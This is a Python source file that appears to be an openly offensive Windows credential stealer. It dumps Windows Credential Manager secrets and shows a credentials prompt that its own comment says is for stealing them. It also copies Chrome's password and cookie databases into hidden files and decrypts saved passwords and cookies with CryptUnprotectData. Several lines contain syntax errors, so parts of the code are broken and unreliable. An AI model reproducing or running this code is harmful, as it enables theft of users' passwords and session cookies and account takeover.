import os
import io
import sys
import sqlite3
import json
import shutil
import win32cred
import win32crypt
import win32api
import win32con
import pywintypes

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC

class credentials:
    # credentials class to differentiate from the cookies methods.

    def dump_credsman_generic():

        CredEnumerate = win32cred.CredEnumerate
        CredRead = win32cred.CredRead

        try:
            creds = CredEnumerate(None, 0)  # Enumerate credentials
        except Exception:                   # avoid crashing on any exception
            pass

        credentials = []

        for package in creds:
            try:
                target = package['TargetName']
                creds = CredRead(target, CRED_TYPE_GENERIC)
                credentials.append(creds)
            except pywintypes.error:
                pass

        credman_creds = io.StringIO() # In-memory text stream

        for cred in credentials:

            service = cred['TargetName']
            username = cred['UserName']
            password = cred['CredentialBlob'].decode()

            credman_creds.write(f'Service: {str(service)}\n'})
            credman_creds.write(f'Username: {str(username)}\n'})
            credman_creds.write('Password: {str(password}\n'})
            credman_creds.write('\n')

        return credman_creds.getvalue()

    def prompt_for_credentials():
        # prompt the user to give permission to steal their credentials
       
        CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials
        
        creds = []

        try:
            creds = CredUIPromptForCredentials(.os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
        except Exception:   # pass exceptions
            pass
        return creds

    def dump_chrome_passwords():
        try:
            login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
            shutil.copy2(login_data, './Login Data') # copy DB to current dir
            win32api.SetFileAttributes('./Login Data', win32con.FILE_ATTRIBUTE_HIDDEN) # make file invisible during operation
        except Exception:
            pass

        chrome_credentials = io.StringIO() # In-memory text stream

        try:
            conn = sqlite3.connect('./Login Data', )                                        # connect to database
            cursor = conn.cursor()                                                          # create a cursor to fetch the data
            cursor.execute('SELECT action_url, username_value, password_value FROM logins') # run the query
            results = cursor.fetchall()                                                     # get the results
            conn.close()                                                                    # close the database file so it's not locked by the process
            os.remove('Login Data')                                                         # delete file when done as the results are in a variable

            for action_url, username_value, password_value in results:
                password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1]    # decrypt the password with CryptUnprotectData
                if password:                                                                        # write credentials to text stream in memory
                    chrome_credentials.write('URL: ' + action_url + '\n')
                    chrome_credentials.write('Username: ' + username_value + '\n')
                    chrome_credentials.write('Password: ' + str(password) + '\n')
                    chrome_credentials.write('\n')
            return chrome_credentials.getvalue()

        except sqlite3.OperationalError as e:   # simple exception handling to avoid crashing
            print(e)                            # when opening the Login Data database
            pass

        except Exception as e:                  # avoid crashing for any other exception
            print(e)
            pass

    def dump_chrome_cookies():
        try:
            login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Cookies'   # path to cookies database file
            shutil.copy2(login_data, './Cookies')                                                       # copy DB to current dir
            win32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)                     # make file invisible during operation

        except Exception:
            pass

        try:
            conn = sqlite3.connect('./Cookies')                                                         # connect to database
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')                # run the query
            results = cursor.fetchall()                                                                 # get the results

            # decrypt the cookie blobs
            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()

                # updating the database with decrypted values
                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\
                        is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",(decrypted_value, host_key, name));

            conn.commit()   # save the changes
            conn.close()    # close the database file so it's not locked by the process

        except Exception as e:   # avoid crashes from exceptions if any occurs
            print(e)
            pass


